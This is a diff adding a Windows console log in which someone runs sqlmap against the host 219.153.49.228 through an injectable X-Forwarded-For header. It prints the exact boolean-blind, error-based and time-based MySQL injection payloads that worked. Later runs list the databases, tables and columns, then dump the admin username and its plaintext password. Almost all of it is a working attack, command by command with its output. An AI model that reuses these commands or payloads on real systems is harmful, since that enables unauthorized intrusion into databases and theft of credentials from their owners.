@@ -1,0 +1,347 @@
+Microsoft Windows [版本 10.0.14393]
+(c) 2016 Microsoft Corporation。保留所有权利。
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>sqlmap.py -r xff.txt --dbs --batch
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt --dbs --batch
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:10:45 /2019-09-26/
+
+[15:10:45] [INFO] parsing HTTP request from 'xff.txt'
+[15:10:45] [CRITICAL] specified file 'xff.txt' does not contain a valid HTTP request
+
+[*] ending @ 15:10:45 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt --dbs --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:12:22 /2019-09-26/
+
+[15:12:22] [INFO] parsing HTTP request from 'xff.txt'
+[15:12:22] [CRITICAL] specified file 'xff.txt' does not contain a valid HTTP request
+
+[*] ending @ 15:12:22 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt --dbs --batch
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:13:14 /2019-09-26/
+
+[15:13:14] [INFO] parsing HTTP request from 'xff.txt'
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[15:13:14] [INFO] testing connection to the target URL
+[15:13:14] [INFO] heuristics detected web page charset 'utf-8'
+[15:13:14] [INFO] checking if the target is protected by some kind of WAF/IPS
+[15:13:14] [INFO] testing if the target URL content is stable
+[15:13:15] [INFO] target URL content is stable
+[15:13:15] [INFO] testing if (custom) HEADER parameter 'X-Forwarded-For #1*' is dynamic
+[15:13:15] [INFO] (custom) HEADER parameter 'X-Forwarded-For #1*' appears to be dynamic
+[15:13:15] [INFO] heuristics detected web page charset 'ascii'
+[15:13:15] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'X-Forwarded-For #1*' might be injectable (possible DBMS: 'MySQL')
+[15:13:15] [INFO] heuristic (XSS) test shows that (custom) HEADER parameter 'X-Forwarded-For #1*' might be vulnerable to cross-site scripting (XSS) attacks
+[15:13:15] [INFO] testing for SQL injection on (custom) HEADER parameter 'X-Forwarded-For #1*'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[15:13:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:13:15] [WARNING] reflective value(s) found and filtering out
+[15:13:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:13:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[15:13:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[15:13:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[15:13:22] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[15:13:23] [INFO] (custom) HEADER parameter 'X-Forwarded-For #1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
+[15:13:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[15:13:23] [INFO] (custom) HEADER parameter 'X-Forwarded-For #1*' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable
+[15:13:23] [INFO] testing 'MySQL inline queries'
+[15:13:23] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[15:13:23] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[15:13:24] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[15:13:24] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[15:13:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[15:13:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[15:13:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[15:13:34] [INFO] (custom) HEADER parameter 'X-Forwarded-For #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[15:13:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[15:13:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[15:13:35] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[15:13:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[15:13:56] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[15:14:01] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[15:14:05] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[15:14:12] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[15:16:11] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[15:16:13] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[15:16:14] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[15:16:15] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+(custom) HEADER parameter 'X-Forwarded-For #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 392 HTTP(s) requests:
+---
+Parameter: X-Forwarded-For #1* ((custom) HEADER)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: 127.0.0.1' RLIKE (SELECT (CASE WHEN (5263=5263) THEN 0x3132372e302e302e31 ELSE 0x28 END)) AND 'TCnC'='TCnC
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: 127.0.0.1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176717671,(SELECT (ELT(6347=6347,1))),0x7170767671,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'taMb'='taMb
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 127.0.0.1' AND (SELECT 4891 FROM (SELECT(SLEEP(5)))MLkw) AND 'oeTl'='oeTl
+---
+[15:16:16] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.5
+[15:16:16] [INFO] fetching database names
+[15:16:16] [INFO] used SQL query returns 2 entries
+[15:16:16] [INFO] retrieved: 'information_schema'
+[15:16:16] [INFO] retrieved: 'webcalendar'
+available databases [2]:
+[*] information_schema
+[*] webcalendar
+
+[15:16:16] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\219.153.49.228'
+
+[*] ending @ 15:16:16 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt -D webcalendar --table --batch
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: sqlmap.py [options]
+
+sqlmap.py: error: ambiguous option: --table (--table-prefix, --tables?)
+
+Press Enter to continue...
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt -D webcalendar --table --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: sqlmap.py [options]
+
+sqlmap.py: error: ambiguous option: --table (--table-prefix, --tables?)
+
+Press Enter to continue...
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt -D webcalendar --tables --batch
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:18:31 /2019-09-26/
+
+[15:18:31] [INFO] parsing HTTP request from 'xff.txt'
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[15:18:31] [INFO] resuming back-end DBMS 'mysql'
+[15:18:31] [INFO] testing connection to the target URL
+[15:18:32] [INFO] heuristics detected web page charset 'utf-8'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: X-Forwarded-For #1* ((custom) HEADER)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: 127.0.0.1' RLIKE (SELECT (CASE WHEN (5263=5263) THEN 0x3132372e302e302e31 ELSE 0x28 END)) AND 'TCnC'='TCnC
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: 127.0.0.1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176717671,(SELECT (ELT(6347=6347,1))),0x7170767671,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'taMb'='taMb
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 127.0.0.1' AND (SELECT 4891 FROM (SELECT(SLEEP(5)))MLkw) AND 'oeTl'='oeTl
+---
+[15:18:32] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.5
+[15:18:32] [INFO] fetching tables for database: 'webcalendar'
+[15:18:32] [INFO] heuristics detected web page charset 'ascii'
+[15:18:32] [INFO] used SQL query returns 2 entries
+[15:18:32] [INFO] retrieved: 'logins'
+[15:18:32] [INFO] retrieved: 'user'
+Database: webcalendar
+[2 tables]
++--------+
+| user   |
+| logins |
++--------+
+
+[15:18:32] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\219.153.49.228'
+
+[*] ending @ 15:18:32 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt -d webcalendar -t user --columns --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.9.20#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:19:46 /2019-09-26/
+
+[15:19:46] [INFO] parsing HTTP request from 'xff.txt'
+[15:19:46] [INFO] setting file for logging HTTP traffic
+[15:19:46] [CRITICAL] invalid target details, valid syntax is for instance 'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME' or 'access://DATABASE_FILEPATH'
+
+[*] ending @ 15:19:46 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt -D webcalendar -T user --columns --batch
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:20:25 /2019-09-26/
+
+[15:20:25] [INFO] parsing HTTP request from 'xff.txt'
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[15:20:25] [INFO] resuming back-end DBMS 'mysql'
+[15:20:25] [INFO] testing connection to the target URL
+[15:20:26] [INFO] heuristics detected web page charset 'utf-8'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: X-Forwarded-For #1* ((custom) HEADER)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: 127.0.0.1' RLIKE (SELECT (CASE WHEN (5263=5263) THEN 0x3132372e302e302e31 ELSE 0x28 END)) AND 'TCnC'='TCnC
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: 127.0.0.1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176717671,(SELECT (ELT(6347=6347,1))),0x7170767671,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'taMb'='taMb
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 127.0.0.1' AND (SELECT 4891 FROM (SELECT(SLEEP(5)))MLkw) AND 'oeTl'='oeTl
+---
+[15:20:26] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.5
+[15:20:26] [INFO] fetching columns for table 'user' in database 'webcalendar'
+[15:20:26] [INFO] heuristics detected web page charset 'ascii'
+[15:20:26] [INFO] used SQL query returns 3 entries
+[15:20:26] [INFO] retrieved: 'id'
+[15:20:26] [INFO] retrieved: 'int(11)'
+[15:20:26] [INFO] retrieved: 'username'
+[15:20:26] [INFO] retrieved: 'varchar(50)'
+[15:20:26] [INFO] retrieved: 'password'
+[15:20:26] [INFO] retrieved: 'varchar(50)'
+Database: webcalendar
+Table: user
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(50) |
+| username | varchar(50) |
++----------+-------------+
+
+[15:20:26] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\219.153.49.228'
+
+[*] ending @ 15:20:26 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap -r xff.txt -D webcalendar -T user -C username,password --dump --batch
+python: can't open file 'sqlmap': [Errno 2] No such file or directory
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>python sqlmap.py -r xff.txt -D webcalendar -T user -C username,password --dump --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.3.9.20#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:21:58 /2019-09-26/
+
+[15:21:58] [INFO] parsing HTTP request from 'xff.txt'
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[15:21:59] [INFO] resuming back-end DBMS 'mysql'
+[15:21:59] [INFO] testing connection to the target URL
+[15:21:59] [INFO] heuristics detected web page charset 'utf-8'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: X-Forwarded-For #1* ((custom) HEADER)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: 127.0.0.1' RLIKE (SELECT (CASE WHEN (5263=5263) THEN 0x3132372e302e302e31 ELSE 0x28 END)) AND 'TCnC'='TCnC
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: 127.0.0.1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176717671,(SELECT (ELT(6347=6347,1))),0x7170767671,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'taMb'='taMb
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 127.0.0.1' AND (SELECT 4891 FROM (SELECT(SLEEP(5)))MLkw) AND 'oeTl'='oeTl
+---
+[15:21:59] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.5
+[15:21:59] [INFO] fetching entries of column(s) 'password, username' for table 'user' in database 'webcalendar'
+[15:21:59] [INFO] heuristics detected web page charset 'ascii'
+[15:21:59] [INFO] used SQL query returns 1 entry
+[15:21:59] [INFO] retrieved: '621213268'
+[15:21:59] [INFO] retrieved: 'admin'
+Database: webcalendar
+Table: user
+[1 entry]
++----------+-----------+
+| username | password  |
++----------+-----------+
+| admin    | 621213268 |
++----------+-----------+
+
+[15:21:59] [INFO] table 'webcalendar.`user`' dumped to CSV file 'C:\Users\Administrator\AppData\Local\sqlmap\output\219.153.49.228\dump\webcalendar\user.csv'
+[15:21:59] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\219.153.49.228'
+
+[*] ending @ 15:21:59 /2019-09-26/
+
+
+F:\zytools\sqlmapproject-sqlmap-1.3.9-20-g5168daf\sqlmapproject-sqlmap-5168daf>
